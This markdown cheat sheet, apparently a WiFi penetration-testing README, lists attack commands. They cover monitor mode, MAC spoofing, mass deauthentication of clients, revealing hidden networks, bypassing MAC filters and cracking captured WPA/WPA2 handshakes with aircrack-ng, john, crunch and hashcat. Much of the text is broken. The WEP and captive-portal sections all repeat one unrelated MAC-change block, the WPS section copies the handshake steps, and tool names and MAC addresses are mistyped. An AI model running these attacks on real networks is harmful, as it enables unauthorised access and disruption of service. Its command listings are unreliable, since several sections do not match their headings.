## Table of Contents

* [General WiFi Information](#general-wifi-information)
* [Enabling Monitor mode](#enabling-monitor-mode)
* [Attack/PenTesting](#attackpentesting)
  * [Pre-connection Attacks](#Pre-connection-Attacks)
    * [MAC address changing](#MAC-address-changing)
    * [Deauthenticating All Clients From Protected WiFi Network](#Deauthenticating-All-Clients-From-Protected-WiFi-Network)
    * [Deauthenticating a Client From Protected WiFi Networks](#Deauthenticating-a-Client-From-Protected-WiFi-Networks)
  * [Gaining Access](#Gaining-Access)
    * [Discovering Names of Hidden Networks](#Discovering-Names-of-Hidden-Networks)
    * [Bypassing Mac Filtering (Blacklists & Whitelists)](#Bypassing-Mac-Filtering-(Blacklists-&-Whitelists))
    * [Bypassing Captive portals](#Bypassing-Captive-portals)
	* [WEP ](#others)
	* [WPA/WPA 2 ](###WPA/WPA2)
              .
	    * [Exploiting WPS ](#others)
	    * [Wordlist Attack ](#others)
	    * [Evil Twin Attack ](#others)
	* [WPA/WPA2 Enterpise](#others)
	* [Fake Access Point](#others)
  * [Post-connection Attacks](#injection)
    * [Capture data](#wepwpawpa2)
    * [Information Gathering](#wps)
    * [Bypass HTTPs](#others)
	* [Bypass router-side security features ](#others)
	* [MITM Attack ](#others)
	* [ARP spoofing](#others)
	* [DNS spoofing](#others)
	* [DoS Attack ](#others)
	* [Data Modification ](#others)
	* [Sniffing Cookies](#others)
	* [Session Hijacking](#others)
	* [Other Attacks](#others)
## Enabling Monitor mode
```Bash
  > iwconfig
  > airmon-ng check kill  
  > airmon-ng start wlan1 
  > airodump-ng wlan1mon 
    OR
  > airodump-ng --band a wlan1mon (show all type of wifi networks 5 Ghz or 2.4 Ghz)
  ```
  ## Pre-connection Attacks
### MAC address changing
```Bash
  > ifconfig wlan0 down
  > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
  > ifconfig wlan0 up 
  > ifconfig wlan0 
  ```
 ### Deauthenticating All Clients From Protected WiFi Network
```Bash
  > airodump-ng -bssid 44:55:tt:ee:ee:bb --channel 11 wlan0
  > aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb wlan0  
  ```
### Deauthenticating a Client From Protected WiFi Networks
```Bash
  > aireplay-ng --deauth 10000000 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0  
  ```
  ## Gaining Access
 ### Discovering Names of Hidden Networks
```Bash
  > airodump-ng --bssid 44:55:tt:ee:ee:bb --channel 6 wlan0
  > airoplay-ng --deauth 4 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0  
  ```
 ### Bypassing Mac Filtering (Blacklists & Whitelists)
```Bash
  > ifconfig wlan0 down
  > macchanger -m 22:dd:33:44:55:66 wlan0  
  ```
  ### Bypassing Captive portals
```Bash
  > ifconfig wlan0 down
  > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
  > ifconfig wlan0 up 
  > ifconfig wlan0 
  ```
  ### WEP 
  ##### Method 1 - Fake Authentication Attack
```Bash
  > ifconfig wlan0 down
  > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
  > ifconfig wlan0 up 
  > ifconfig wlan0 
  ```
  ##### Method 2 - ARP Replay Attack
```Bash
  > ifconfig wlan0 down
  > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
  > ifconfig wlan0 up 
  > ifconfig wlan0 
  ```
 ##### Method 3 - Chop Chop Attack
```Bash
  > ifconfig wlan0 down
  > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
  > ifconfig wlan0 up 
  > ifconfig wlan0 
  ```
  ##### Method 4 - Fragmentation Attack
```Bash
  > ifconfig wlan0 down
  > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
  > ifconfig wlan0 up 
  > ifconfig wlan0 
  ```
  ##### Method 5 - SKA (Shared Key Authentication) Type Cracking
```Bash
  > ifconfig wlan0 down
  > ifconfig wlan0 hw ether 00:ff:ff:ff:44:55  
  > ifconfig wlan0 up 
  > ifconfig wlan0 
  ```
  
   ### WPA/WPA2
   #### Capture Handshake File
   
  ##### Method 1 - Fake Authentication Attack
```Bash
  > airodump-ng --bssid AP:MA:C0:EE:VV --channel 11 --write handshakefilename mon0
  > airplay-ng --deauth 4 -a AP:MA:C0:EE:VV -c CL:IE:NT:MA:C0 mon0
  ```
   #### Exploiting WPS
   ##### Method 1 - Fake Authentication Attack
```Bash
  > airodump-ng --bssid AP:MA:C0:EE:VV --channel 11 --write handshakefilename mon0
  > airplay-ng --deauth 4 -a AP:MA:C0:EE:VV -c CL:IE:NT:MA:C0 mon0
  ```
  #### Wordlist Attack
   ##### Method 1 - Using aircrack-ng
```Bash
  > aircrack-ng handshake.cap -w wordlist.txt
  ```
   
   ##### Method 2 - Saving Aircrack-ng Cracking Progress
```Bash
  > john --wordlist=wordlist.txt --stdout --session=upc | aircrack-ng -w - -b 00:uu:sd:23:56 handshake.cap
  > john --restore=upc | aircrack-ng -w - -b 00:uu:sd:23:56 handshake.cap
  ```
   ##### Method 3 - Using Huge Wordlists With Aircrack-ng Without Wasting Storage
```Bash
  > crunch 8 8 | aircrack-ng -b 00:uu:sd:23:56 -w - handshake.cap
  ```
   ##### Method 4 - Saving Cracking Progress When Using Huge Wordlists Without Wasting Storage
```Bash
  > crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b 00:uu:sd:23:56 -w - handshake.cap
  > crunch 8 8 | john --stdin --restore=session1 | aircrack-ng -b 00:uu:sd:23:56 -w - handshake.cap
  ```
   ##### Method 5 - Cracking WPAWPA2 Much Faster Using GPU (hashcat - https://hashcat.net/hashcat/)
```Bash
  > //convert .hcap to .hccapx (https://hashcat.net/cap2hccapx/)
  > hashcat -m 2500 -d 1 handshake.hccapx wordlist.txt
  ```
